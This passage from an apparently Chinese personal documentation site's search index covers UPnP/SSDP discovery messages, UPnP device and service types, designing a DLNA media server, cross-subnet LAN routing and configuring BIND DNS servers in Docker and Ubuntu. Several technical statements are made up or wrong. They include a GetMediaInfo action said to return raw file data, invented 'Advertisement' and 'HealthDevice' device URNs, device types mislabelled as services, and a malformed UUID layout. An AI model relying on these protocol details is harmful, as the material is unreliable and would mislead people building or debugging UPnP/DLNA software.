查询device-Type字段\n指定的设备类型，设备类型和版本由UPNP组织定义 urn:schemas-upnp-org:service:service-type :{version} 查询service-Type字段\n指定的服务类型，服务类型和版本由UPNP组织定义 搜索网络上的所有设备。设备需在3秒内返回响应。 ssdp:response 响应消息 当设备接收到 M-SEARCH搜索消息 后,需要返回ssdp:response响应消息。例如: HTTP/1.1 200 OK\nCACHE-CONTROL: max-age=1800\nDATE: Fri, 15 Jun 2018 04:56:29 GMT\nEXT:\nLOCATION: http://192.168.1.20:5678/device.xml\nSERVER: Linux/3.14.0 UPnP/1.1 XXX-Device/1.0\nST: upnp:rootdevice\nUSN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 EXT: 留作扩展使用的头部。目前未使用。 ST: 搜索目标(Search Target)字段,返回搜索的设备类型。这里是upnp:rootdevice表示根设备。 SERVER: 服务器字段,提供响应设备的操作系统、UPnP协议版本和设备信息。格式不严格指定,由设备厂商自定义。 ssdp:byebye退出消息 当UPnP设备从网络移除时,它需要发送ssdp:byebye消息以通知网络上的其他设备: NOTIFY * HTTP/1.1\nHOST: 239.255.255.250:1900\nNT: upnp:rootdevice\nUSN: uuid:device-UUID NOTIFY方法表示这是一条通告消息 收到此ssdp:byebye消息的其他设备,将删除对应设备信息,知晓该设备已不再存在于网络中。 UPnP设备需要在从网络断开时发送ssdp:byebye消息,而不能仅仅断开网络连接就离开。\n否则,其他设备会一直认为它存在,直到其ssdp:alive消息过期。ssdp:byebye消息能更清晰的告知设备的离开,避免其他设备的错误认知。 描述 每个 UPnP 设备都有一个 XML 设备描述文件和一个或多个服务描述文件,描述设备和服务的详细信息。这些描述文件根据 UPnP 设备架构制定。 控制 UPnP 使用简单对象访问协议(SOAP)实现设备的远程控制和查询。 事件通知 UPnP 使用通用事件通知架构(GENA)使设备能主动通知控制点其内部状态的变化。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html"},{"title":"设备/服务类型","text":"UPnP具有的Server类型 UPnP 定义了多种设备和服务类型,对应不同的功能和用途。其中 UPnP 设备类型由 UPnP 论坛定义和维护,常见的有: 1. 媒体服务器(MediaServer)\n提供数字媒体内容存储和流式传输功能,如音乐、视频和图片。例如 Windows Media Player 可以发现这类设备并播放其媒体。\n2. 媒体渲染器(MediaRenderer)\n用于渲染数字媒体内容,如播放音乐、视频和显示图片。例如网络音响、网络电视和数字媒体播放器。\n3. 网关设备(InternetGatewayDevice)\n提供路由和互联网访问服务。大多数家用路由器实现此设备类型。\n4. 打印机(Printer)\n提供打印服务,允许网络计算机发现并使用连接的打印机。\n5. 扫描仪(Scanner)\n提供扫描服务,允许网络计算机控制扫描仪扫描文档。\n6. 健康设备(HealthDevice)\n提供健康和医疗设备相关的服务,用于远程监控。\n7. 家庭自动化(HomeAutomation)\n提供家居自动化设备控制,如灯光、电视等。智能家居产品常实现此类型。\n8. 广告设备(Advertisement) 提供广告相关的服务,可以将广告信息推送到订阅客户端。\nUPnP 设备会在自己的设备描述中声明具体实现的设备类型,这样 UPnP 控制点根据设备类型就可以判断设备提供的服务类型和功能。\n其中媒体和路由器设备可能是最常见的类型。 具体的ID定义 在 UPnP 中,每个设备类型都对应一个标准的 server type 编号,也称 UPnP Device Type IDs。\n这些编号由 UPnP 论坛定义和维护,以标识不同类型的 UPnP 设备。\n常见的几种 UPnP 设备类型及其 server type ID 如下: 媒体服务器(MediaServer): urn:schemas-upnp-org:device:MediaServer:1 媒体渲染器(MediaRenderer): urn:schemas-upnp-org:device:MediaRenderer:1 路由器(InternetGatewayDevice): urn:schemas-upnp-org:device:InternetGatewayDevice:1 打印机(Printer): urn:schemas-upnp-org:device:Printer:1 扫描仪(Scanner): urn:schemas-upnp-org:device:Scanner:1 家庭自动化(HomeAutomation): urn:schemas-upnp-org:device:HomeAutomation:1 广告设备(Advertisement): urn:schemas-upnp-org:device:Advertisement:1 等等,每个设备类型都有自己唯一的 server type ID 进行标识。\nUPnP 设备在其设备描述中,通过包含自己对应的标准 server type ID,来告知控制点自己具体实现的是哪种设备类型。\n例如,如果一个 UPnP 设备的设备描述中包含: <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType> 则该设备实现的是 UPnP 媒体服务器设备类型。\nUPnP 控制点可以通过解析设备描述,获取其中的 deviceType 信息,进而确定设备类型和支持的服务。\n所以,UPnP Device Type ID 允许在标准的 UPnP 框架下,定义和识别各种服务器设备类型,这为 UPnP 设备之间的互操作性提供了基础。\n开发 UPnP 设备时,需要选择一个已有的标准设备类型,或者定义一个新的设备类型(并申请一个唯一 ID),以便其他 UPnP 控制点能够正确识别该设备。 UPnP常见几种服务 AVTransport Service （可控制多屏设备上的媒体 play，pause，seek，stop 等） RenderingControl Service （可调节多屏设备上的音量，声音，静音等） ContentDirectory Service （可获取多屏设备上可访问的媒体内容） ConnectionManager Service （可提供所支持的传输协议信息及多屏设备的 MIME 格式信息） DLNA 各种设备术语 Digital Media Controller（DMC）数位媒体控制器：\n作为遥控装置使用，可寻找 DMS 上的多媒体档案，\n并指定可播放该多媒体档案的 DMR 进行播放或是控制多媒体档案上下传到 DMS 的装置，一般是手机。 Digital Media Server（DMS）数位媒体服务器：\n提供了媒体档案的获取、录制、储存以及作为源头的装置。一般是公网上流媒体服务器 Digital Media Renderer（DMR）数位媒体控制器：\n可接收并播放从 DMC push 过来的媒体档案。即接收投屏数据，一般是智能电视，OTT 盒子等。 这三者的关系是，DMC 通过获取 DMS 上的歌曲或者视频（也可以不是 DMS 上的，而仅仅只是一个链接），把它们传送到 DMR 上，由 DMR 进行播放。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Equipment-·-Service-Type.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Equipment-·-Service-Type.html"},{"title":"自己实现DLNA媒体服务器","text":"实现一个完备的媒体服务器, 需要的设备服务分类 MediaServer设备: 提供资源发现和访问 必选服务:MediaServer , 媒体服务器服务, 提供媒体资源发现和元数据访问 公开服务器上的媒体资源,客户端可以浏览和搜索资源 客户端选择资源后,获取资源的详细信息(元数据)和流URL 必选服务:ContentDirectory , 内容目录服务\n- 将存储在UPnP媒体服务器上的资源以树形结构组织起来方便浏览\n- 支持根据资源类型(容器、对象)或元数据属性对资源进行过滤和搜索\n- 允许控制点检索存储在服务中的资源的详细信息 可选服务:ConnectionManager, 连接管理器服务, 管理对服务器的连接,验证和授权客户端。可选服务.\n若提供敏感数据或服务,需要对访问进行控制, 推荐实现 MediaRenderer设备: 获取流播放 必选服务:MediaRenderer,AVTransport 可选服务:ConnectionManager,MediaServer 其中: 媒体渲染器服务(MediaRenderer):获取和解码播放流媒体 接收客户端指定的流URL,从URL中获取媒体流 解码并播放收到的媒体流,实现远程流媒体播放 AV传输服务(AVTransport):控制MediaRenderer的播放 用于控制MediaRenderer的播放,实现播放控制(播放/暂停/停止/Seek等) 发布播放状态和进度等,供客户端监控 连接管理器服务(ConnectionManager):管理对渲染器的连接,可选服务 用于管理客户端与媒体服务器/渲染器的连接 验证客户端,授权流连接,并在连接断开时清理资源 提供流媒体播放服务, 若需要对连接和 Play 进行控制, 则推荐实现 媒体服务器服务(MediaServer):可选服务,如果MediaRenderer也存储资源可以实现。 如果一个设备同时具备资源存储+流媒体播放的功能,也可以选择只实现MediaRenderer设备,\n并在其中同时包含MediaServer与MediaRenderer服务。但这需要MediaRenderer标准能够满足对应要求 具体可以通过以下设备描述将其定义为一个MediaServer+MediaRenderer设备: <root xmlns=\"urn:schemas-upnp-org:device-1-0\">\n<specVersion>\n<major>1</major>\n<minor>0</minor>\n</specVersion>\n<device>\n<deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType>\n<friendlyName>MY MEDIA SERVER</friendlyName>\n...\n</device>\n<device>\n<deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType>\n<friendlyName>MY MEDIA RENDERER</friendlyName>\n...\n</device>\n</root> 该描述, 定义了一个带MediaServer和MediaRenderer设备类型的UPnP设备。从而在一个物理设备上提供完整的远程媒体浏览、播放和控制功能。 最小化存储媒体服务器 仅实现一个具有存储功能的设备服务, 类似于纯文件服务器, 媒体播放方面如解码/编码等由客户端自己实现. 可行方案: 使用设备: MediaServer ContentDirectory:提供文件存储目录和文件元数据的访问 ConnectionManager:管理客户端连接 这时候客户端需要实现 MediaRenderer:获取文件数据,解码并播放 AVTransport:自己实现播放控制 ConnectionManager:管理连接服务器获取文件 工作流程为: 客户端通过ContentDirectory浏览文件服务器上的文件,获取文件元数据 客户端选择文件后,通过ConnectionManager与文件服务器建立连接,获取文件数据 客户端自身具备解码和播放文件的能力,使用自己的MediaRenderer和AVTransport实现文件播放 客户端可以控制自己的播放,无需依赖服务器 这种方案的优点是: 文件服务器实现简单,只需提供文件存储和访问 客户端有更大的灵活性,可以选择任意的解码和播放方案 兼容性好,任何能够获取文件并播放的客户端都可以访问 缺点是: 客户端需要自行实现较复杂的流媒体播放功能 播放体验依赖客户端,无法统一 无法利用UPnP等标准来简化开发和提高互操作性 如果文件服务器只提供文件存储功能,依赖客户端实现播放,这种方案是可行的,可以获得较好的兼容性和灵活性。\n但客户端开发会较为复杂,无法利用UPnP等标准来简化流程。 如果想进一步利用UPnP标准,可以考虑文件服务器实现:\n设备类型:MediaServer+MediaRenderer\n对应服务:\n- ContentDirectory\n- ConnectionManager\n- MediaRenderer\n- AVTransport 这样文件服务器可以直接对获取的文件解码和播放,并使用标准的AVTransport实现播放控制,这可以最大限度简化客户端开发,利用UPnP标准提高互操作性。同时也控制了播放体验,这是一种更佳的实现方案。 但是这样客户端只能进行项目浏览(看有哪些文件/文件夹), 不能访问具体的媒体数据(不能媒体传输播放视频). 若需要支持数据传输, 还需要实现: MediaRenderer 服务, 使用下面的 GetMediaInfo action来获取媒体数据. GetMediaInfo Action的输入输出参数如下: 输入参数: InstanceID: 媒体实例ID,由Browse等Action返回 Filter: 指定返回的数据类型,如:\"*\"返回所有信息 输出参数: CurrentSrc: 媒体URL,指向实际的媒体文件 MetaInfo: 媒体元数据信息 Data: 实际的媒体文件数据,二进制 对应的参数类型为: InstanceID: string Filter: string CurrentSrc: string,url MetaInfo: string,xml Data: bin.base64 典型的调用流程为: 客户端调用ContentDirectory的BrowseAction获取要播放的媒体InstanceID 使用InstanceID调用GetMediaInfo Action,同时指定Filter为\"*\",表示返回所有信息 服务器返回CurrentSrc(媒体URL)、MetaInfo(元数据)和Data(文件数据) 客户端获取Data,调用系统API进行解码和播放 客户端可以使用Seek, Pause等Action控制播放 当客户端要主动获取服务器上的媒体文件并自行播放时,GetMediaInfo这个Action是最关键的。\n它可以返回媒体的URL,元数据和文件数据,让客户端获得全部所需信息进行播放。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html"},{"title":"自己实现DLNA相关","text":"前景 去年买了个投影仪, 奈何想看高分辨率视频还得另外开会员, 最初是网上资源下载到硬盘,\n然后用来两种方式: 在电脑开启samba协议, 投影仪访问samba共享库 把硬盘插投影仪播放 前者对于很大的视频而言, 卡;\n后者插个小尾巴, 影响观感, 且不方便.\n于是, 多方查询后选择了使用 DLNA 协议来解决(投影仪本身也支持),\n又因为Windows自带的很垃圾, 时能用, 时不能用, 重装系统后干脆完全不能用了. 先提前解释一些概念 多播地址 多播地址允许在 UDP 层一次性将数据包发送给多台主机,任意主机都可以自动加入和离开多播组,这使其非常适合用于点对多点的应用,\n如视频会议、游戏等。 UPnP 就采用标准的多播地址 239.255.255.250,实现在局域网中设备服务的自动发现,这也是 UPnP 协议的一大优点。 UPnP UPnP 采用标准的 多播地址 239.255.255.250,\n实现在局域网中设备服务的自动发现 大致流程如下: 路由器/当前网络/当前设备支持 UPnP 当有新的 UPnP 设备加入网络或者发送搜索请求,该设备会向 239.255.255.250:1900 发送生存通告或搜索响应\n(来表示自己是一个 UPnP 设备) 同时, UPnP 控制点设备也会使用 UDP 发送搜索请求到 239.255.255.250:1900,发现网络中的 UPnP 设备。 简单来说: UPnP 设备使用 239.255.255.250:1900 主动发送生存通告,以发布自己。 UPnP 控制点使用 239.255.255.250:1900 发送搜索请求,以发现 UPnP 设备。 UPnP 设备收到搜索请求后,会响应到请求来源(控制点),向其发送设备描述等信息。 然后控制点和设备之间可以建立直接的 TCP 连接,用于设备控制、事件通知等。 注解 UPnP 设备: 每个 UPnP 设备 都可视作一个单独的服务端, 提供服务;\n需要遵循 UPnP 设备架构,提供设备描述、服务描述等, 如媒体服务器、路由器等。 UPnP 控制点: 可视作 UPnP 客户端, 访问和控制服务;\n需要遵循 UPnP 控制点架构,知道如何发现设备、查询服务并控制, 如 Windows Media Player。 这就是 UPnP 中使用 UDP 多播在局域网中实现设备发现的基本过程。\n每个 UPnP 设备和控制点都需要支持这个标准的多播地址和端口(都需要绑定到标准的多播地址 239.255.255.250 和端口 1900 上,),\n才能实现互相发现和交互。\n通过这种基于 UDP 多播的方式,UPnP 设备和控制点不需要事先知道彼此的 IP 地址,就可以实现自动发现与使用,这也是 UPnP 协议的一大优点。 UPnP 的主要功能包括: 设备发现:UPnP 设备可以动态加入和离开网络,并通过 UPnP 发现协议被自动检测。 设备控制:UPnP 设备可以通过控制协议远程控制和查询。 事件通知:UPnP 设备可以异步通知控制点有关设备状态的改变。 服务描述:UPnP 设备包含 XML 设备和服务描述,用于将设备功能及接口公开给控制点。 基本架构:UPnP 协议基于开放互联网基础设施工作组(Open InterConnect Consortium)制定的架构。 UPnP 主要由以下几个协议组成: 发现协议(SSDP):处理新设备的加入和离开。 设备和服务描述协议(XML):描述设备和服务的功能及接口。 控制协议(SOAP):提供设备远程控制和查询的机制。 事件通知协议(GENA):提供设备主动通知控制点状态变化的机制。 UPnP 已广泛应用于家庭自动化、互联网接入服务等领域。主流的 UPnP 设备和控制点有 Windows 系列操作系统、各种路由器、媒体中心等。 详细点的工作机制说明: UPnP 的工作机制主要包括:地址分配、发现、描述、控制和事件通知五部分。 地址分配:UPnP 设备加入网络后,通过自动配置或动态主机配置协议(DHCP)获得一个 IP 地址。 发现:UPnP 设备通过简单服务发现协议(SSDP)广播自己的存在,并侦听其他设备的广播。发现过程中交换设备的唯一标识符、URL 等信息。 描述:每个 UPnP 设备都有一个 XML 设备描述文件和一个或多个服务描述文件,描述设备和服务的详细信息。这些描述文件根据 UPnP 设备架构制定。 控制:UPnP 使用简单对象访问协议(SOAP)实现设备的远程控制和查询。 事件通知:UPnP 使用通用事件通知架构(GENA)使设备能主动通知控制点其内部状态的变化。 UPnP 已广泛应用于各种智能家居和互联网接入设备。\n在 Windows 系统、各种路由器、NAS 存储设备中都采用了 UPnP 技术。\nUPnP 简单易用,跨平台和互operability,已成为智能家庭网络联接的重要基石。 Windows开关流媒体支持 暂时只介绍最简单的 打开: 打开Windows Media Player, 点击流媒体, 根据提示打开\n关闭: 去网络共享中心重制当前网络设置(没有直接关闭窗口) 参考 源代码分析及 DLNA 和 UPnP 协议理解 UPnP基本原理以及在NAT中的应用 alljoyn物联网 (这个没啥看的) UPnP协议编程实践 (这个缺少图片) 更新一下 上面的文档忘了是啥了, 重搜了一下 https://www.cnblogs.com/lcw/p/3416730.html https://blog.csdn.net/maimang1001/article/details/122970389 这个有图片展示 https://blog.csdn.net/weixin_41010318/article/details/78836718","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html"},{"title":"upnp部分字段/术语介绍","text":"UUID UUID含义是通用唯一识别码（Universally Unique Identifier），\n其目的是让分布式系统中的所有元素都有唯一的标识，其格式为xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx（8-4-4-16），\n分别表示当前的日期、时间、始终序列、全局唯一的IEEE机器标识，如果有网卡，则从网络的MAC地址获取，没有网卡则以其他方式获得。 UDN 单一设备名字（Unique Device Name），基于UUID，表示一个设备，在不同的时间，对于同一台设备此值应该是唯一的。 URI Web上可用的每种资源，包括HTML文档、图像、视频片段、程序等，由一个通用资源标志符（Universal Resource Identifier，简称\"URI\"）进行定位。URI一般有三部分组成：访问资源的命名机制、存在资源的主机名、资源自身的名称，由路径表示。考虑下面的URI，它表示了当前的HTML 4.0规范； http://www.webmonkey.com.cn/html/html40 /它表示一个可通过HTTP协议访问的资源，位于主机www.webmonkey.com.cn上，通过路径\"/html/html40\"访问 URL URL是URI命名机制的一个子集，URL是Uniform Resource Location的缩写，译为\"统一资源定位符\"。\n形象点说，URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，\n采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。 URN URN是URL的一种更新形式，统一资源名称（Uniform Resource Name）。\n唯一标识一个实体的标识符，但是不能给出实体的位置。\nURN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。\n尽管普通的URL可以提供类似的功能，但是URN更强大更容易管理，因为它可以引用多个URL。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html"},{"title":"UPnP","text":"upnp部分字段术语介绍 设备·服务类型 详细介绍 自己实现DLNA相关 自己实现DLNA媒体服务器","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-UPNP-protocol-index.html","loc":"/yq-docs-Chaotic-computer-network-UPNP-protocol-index.html"},{"title":"局域网内跨网段访问","text":"方法一:路由器配置路由 如果需要允许多个网段互相访问，您可以按照以下步骤设置路由器： 登录路由器管理控制台 打开您的浏览器，输入默认网关的 IP 地址。\n通常情况下，路由器的默认地址为 192.168.1.1 或 192.168.0.1。\n输入管理员用户名和密码以登录到路由器管理界面。 创建静态路由 在路由器管理控制台中，找到\"路由设置\"或\"网络设置\"等选项，并单击它。\n然后，单击\"添加路由\"或\"创建路由规则\"等按钮。\n在路由设置页面中，您需要创建一条静态路由来允许不同子网之间的通信。\n具体操作取决于您使用的路由器型号和软件版本，但通常可参考以下配置: 目标网络：目标子网地址\n子网掩码：目标子网掩码\n下一跳地址：连接到目标子网的设备 IP 地址\n接口：LAN或WAN 将\"下一跳地址\"替换为连接到目标子网的设备的 IP 地址。\n例如，如果您要连接到 192.168.2.0 子网，该子网的网关 IP 地址为 192.168.1.2，则应将下一跳地址设置为 192.168.1.2。\n最后，单击\"保存\"或\"应用\"按钮。 配置防火墙 如果您的路由器上启用了防火墙，则需要配置防火墙以允许所有子网之间的通信。\n在路由器管理控制台中，找到\"防火墙设置\"或\"安全设置\"等选项，并单击它。\n然后，找到\"访问控制列表\"、\"端口转发\"或\"虚拟服务器\"等选项，并单击\"添加规则\"或\"新建\"等按钮。\n具体操作取决于您使用的路由器型号和软件版本，但通常可参考以下配置: 协议：全部或TCP/UDP\n来源IP：源子网地址\n目标IP：目标子网地址\n目标端口：全部或指定端口\n动作：允许 请将\"源IP\"替换为源子网的 IP 地址范围，\"目标IP\"替换为目标子网的 IP 地址范围。最后，单击\"保存\"或\"应用\"按钮。 问题 可能会降低网络安全性 如果需要允许很多子网之间的互相访问，手动配置静态路由和防火墙规则可能会非常麻烦。为了简化这个过程，您可以考虑以下两种方法： 使用动态路由协议 动态路由协议可以自动学习和更新路由表，从而优化网络通信。\n例如，您可以使用OSPF（开放式最短路径优先）或BGP（边界网关协议）等路由协议来管理多个子网之间的通信。\n通过动态路由协议，路由器可以自动发现新的网络和路由，无需手动配置每个子网的路由。 使用SDN（软件定义网络） SDN将网络控制分离出来，使业务能够以集中的方式管理网络。\n它提供了专门的控制器来管理路由和策略，并允许管理员随时更改网络配置。\n通过SDN，您可以轻松地添加、删除或修改路由和防火墙规则，同时优化网络性能和可靠性。 方法二:VPN","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html","loc":"/yq-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html"},{"title":"docker使用ubuntu/bind部署dns服务","text":"使用的镜像: ubuntu/bind9 创建容器: mkdir -p dns_config\ndocker run -d --name bind9-dns-server -e TZ=UTC -p 30053:53 -v dns_config:/data  ubuntu/bind9:9.18-22.04_beta 后面方式基本与 : ubuntu配置dns 一致 其他 具有管理面板的docker-bind: 使用Docker搭建自己的DNS服务器","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html","loc":"/yq-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html"},{"title":"docker使用bind部署dns服务-管理面板","text":"使用的镜像: sameersbn/bind 使用bind镜像创建: # 创建一个持久化存放文件的目录\nmkdir -p sameersbn/bind\n# 使用容器创建应用\n# --restart=always\ndocker run --name bind -d \\\n--publish 53:53/tcp --publish 53:53/udp --publish 10000:10000/tcp \\\n--volume /Users/yanque/project/docker/sameersbn/bind:/data \\\nsameersbn/bind:9.16.1-20200524 若需要外网访问, 注意开放53的tcp与udp端口 在本机浏览器打开: https://localhost:10000 , 默认账户密码root/password登录, 然后更改语言为中文. 更新语言为中文 创建新的主区域 填写域名, 邮箱, 然后点击新建 选择地址, 然后填写前缀名称与ip (本机ip) 更新本机dns (本机ip) 技巧 如果是在本机使用, 可以直接写 127.0.0.1 访问公网: # vim sameersbn/bind/bind/etc/resolv.conf\nnameserver 114.114.114.114\nnameserver 8.8.8.8\n\n# vim sameersbn/bind/bind/etc/named.conf.options\n# 添加一行，内容如下：\nallow-query { any; }; 重启一下服务，执行以下命令，这样才能使用配置生效: docker restart bind 测试, 访问 自己设置的地址 http://doc.yanquer.com : 访问 其他 具有管理面板的docker-bind: 使用Docker搭建自己的DNS服务器","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html","loc":"/yq-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html"},{"title":"自建局域网dns服务器","text":"完全限定域名(FQDN) = 主机名 + 域名. 例: www.baidu.com = www(主机) + baidu.com(域名) 本机解析寻找顺序: 本机host文件 -> dns服务器 DNS解析方式: 正向解析  FQDN -> IP\n反向解析  IP   -> FQDN 环境搭建 准备一个主机服务器, 设置静态ip, 注意保证使用的机器与此机器在同一个网段 打开windows功能管理, 安装 DNS服务器 打开: 服务器管理 -〉工具 -> DNS服务器 ubuntu配置dns服务器 ubuntu配置dns 其他部署方式 Docker部署bind: docker使用bind部署dns服务 Linux使用bind: ubuntu配置dns (debian也可) 综合 docker-bind部署dns-管理面板 docker使用bind部署dns服务 ubuntu配置dns","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-config_dns-index.html","loc":"/yq-docs-Chaotic-computer-network-config_dns-index.html"},{"title":"ubuntu配置dns服务器","text":"配置dns服务器 为了方便直接使用docker部署, 先配置一个dns机器(后续以 myubuntu_dns_server 代称): # 默认latest版本是 20版本的 focal\ndocker pull ubuntu\ndocker run --name myubuntu_dns_server -itd ubuntu 然后就部署好一个ubuntu服务器了, 进入: docker exec -it myubuntu_dns_server /bin/bash 配置apt源: # 安装证书验证模块才可以配置源\napt update && apt install ca-certificates\n\nmv /etc/apt/sources.list /etc/apt/sources.list.bak\n\necho \"deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n\" > /etc/apt/sources.list\n\napt update && apt install vim\n\n# 安装查看ip工具\napt install iproute2 查看ip为 172.17.0.5 ip a | grep inet 配置普通机器(可选) 再按照上述方式安装一个测试机器(后续以 myubuntu_g1 代称), 验证dns配置是否正确: docker run --name myubuntu_g1 -itd ubuntu\n\n# 参考上面\n...\n\n# 查看ip为 172.17.0.4\nip a | grep inet\n\n# 安装 bind9-utils 以使用host\napt install bind9-utils host dns-server继续配置 实际还应该固定此服务器ip为静态ip, 此处docker部署忽略. dns服务器(myubuntu_dns_server)安装bind9(目前市面是最主流的开源DNS软件) apt install bind9 bind9默认会有一些配置文件, 参见 bind9软件包 配置option 配置option: // 允许进行普通查询的 IP 地址列表，默认允许所有；\nsed -ie \"3a \\ \\ \\ \\ \\ \\ \\ \\ listen-on port 53 { ${ip}; }; allow-query { any; };\n\"  /etc/bind/named.conf.options 其实就是加上: listen-on port 53 { ${ip}; };\nallow-query { any; }; 其中 listen-on 必须配置, 让named知道监听的端口与地址. allow-query 是默认 any 可以忽略 配置正向解析 若配置type为slave 若需要配置从服务器, 格式参考下面配置: zone \"aaa.com\" IN {\n    type slave;                 // 从模式\n    masters { 172.17.0.5; };    // 主服务器的IP\n    file \"slaves/aaa.localhost\";\n    allow-update { none; };\n}; 在 /etc/bind/named.conf.local 添加以下内容: zone \"study.edu\" IN {\n    type master;\n    file \"/var/cache/bind/named.study.com\";\n}; 表示配置一个 study.edu 域名, 作为master, 配置文件在 /var/cache/bind/named.study.com 技巧 可直接: cp /etc/bind/db.local /var/cache/bind/named.study.com 然后修改 现在配置 /var/cache/bind/named.study.com ;\n; BIND data file for study.com\n;\n$TTL        604800\n@   IN      SOA     study.com. root.study.com. (\n                2           ; Serial\n            604800          ; Refresh\n            86400           ; Retry\n            2419200         ; Expire\n            604800 )        ; Negative Cache TTL\n;\n@   IN      NS      localhost.\n@   IN      A       172.17.0.4\n@   IN      AAAA    ::1\n\n; A 表示ipv4地址 AAAA表示ipv6地址 NS表示使用的dns服务器\n; www 会自动加到 study.com. 实际为 www.study.com\nwww IN      A       172.17.0.4\n; qq 会自动加到 study.com. 实际为 qq.study.com\nqq  IN      A       172.17.0.6 警告 这种解析配置文件需要注意空格问题, 切记 否则可能会出现这种问题: Host 5.0.17.172.in-addr.arpa not found: 2(SERVFAIL) 重启 bind9: /etc/init.d/named restart 测试: root@e376019130d3:/# host www.study.edu 172.17.0.5\nUsing domain server:\nName: 172.17.0.5\nAddress: 172.17.0.5#53\nAliases:\n\nwww.study.edu has address 172.17.0.4\nroot@e376019130d3:/#\nroot@e376019130d3:/#\nroot@e376019130d3:/# host qq.study.edu 172.17.0.5\nUsing domain server:\nName: 172.17.0.5\nAddress: 172.17.0.5#53\nAliases:\n\nqq.study.edu has address 172.17.0.6 配置反向解析 警告 多次配置不同的反向代理, 不用重复写 /etc/bind/named.conf.local 下的 zone \"0.17.172.in-addr.arpa\" 在 /etc/bind/named.conf.local 增加以下内容: zone \"0.17.172.in-addr.arpa\" {\n    type master;\n    file \"/var/cache/bind/named.reverse.db.xxx\";\n}; 技巧 可直接: cp /etc/bind/db.127 /var/cache/bind/named.reverse.db.xxx 然后修改 现在配置 /var/cache/bind/named.reverse.db.xxx ;\n; BIND reverse data file for 172.17.0\n;\n$TTL        604800\n@   IN      SOA     study.com. admin.study.com. (\n                1           ; Serial\n            604800          ; Refresh\n            86400           ; Retry\n            2419200         ; Expire\n            604800 )        ; Negative Cache TTL\n;\n@   IN      NS      study.com.\n; 表示 172.17.0.5 会被解析为 study.com. 注意这里都是倒着来\n5   IN      PTR     study.com. 重启: /etc/init.d/named restart 测试反向解析: root@e376019130d3:/#\nroot@e376019130d3:/# host 172.17.0.5 172.17.0.5\nUsing domain server:\nName: 172.17.0.5\nAddress: 172.17.0.5#53\nAliases:\n\n5.0.17.172.in-addr.arpa domain name pointer study.com.\nroot@e376019130d3:/# 技巧 配置dns解析在 /etc/resolv.conf 文件, 作用等同于上面的 172.17.0.5 , 若存在相应配置就, 上述命令可以不用写此IP 设置为DNS缓存服务器 在 /etc/bind/named.conf.options 增加以下内容: allow-query { any; };\nallow-query-cache { any; };     // 允许查询缓存的IP地址列表；\nrecursion yes;                  // 允许递归查询；\nallow-recursion { any; };       // 允许递归查询的IP地址列表；\nforward only;                   // 允许转发；\nforwarders { 172.17.0.5; };     // 转发列表，172.17.0.5 为前面配置的授权服务器；\ndnssec-validation no;           // 关闭 dnssec； 重启bind9: /etc/init.d/named restart 验证: # 清除dns缓存\nrndc flush\n\n# +norecurse 不允许递归查询\ndig @172.17.0.4 www.study.com A +norecurse\n\n# 在授权服务器上抓包\ntcpdump -i eth1 port 53\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes\n&#94;C\n0 packets captured\n0 packets received by filter\n0 packets dropped by kernel 然后再基于允许递归查询抓包, 可以看出 缓存服务器向授权服务器进行递归查询. 不允许递归查询时，DNS 缓存服务器会将缓存结果发送给客户端. 此部分缓存参考:: Bind9：配置 DNS 授权服务器和 DNS 缓存服务器 附, 基础配置脚本, 功能: 配置本机为dns授权服务器","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html","loc":"/yq-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html"},{"title":"计算机网络","text":"多播地址 网络中的NAT模式 IP地址与子网划分 HTTP认识 网络常识 局域网内跨网段访问 config_dns LAN与WAN websocket 协议 upnp协议","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-index.html","loc":"/yq-docs-Chaotic-computer-network-index.html"},{"title":"websocket","text":"url表示常以 ws 开头, 或 wss 开头, 如: wss://127.0.0.1:8080/ ws 与 wss 区别就是后者多了个加密, 就像 http 与 https 一样 包含的消息头 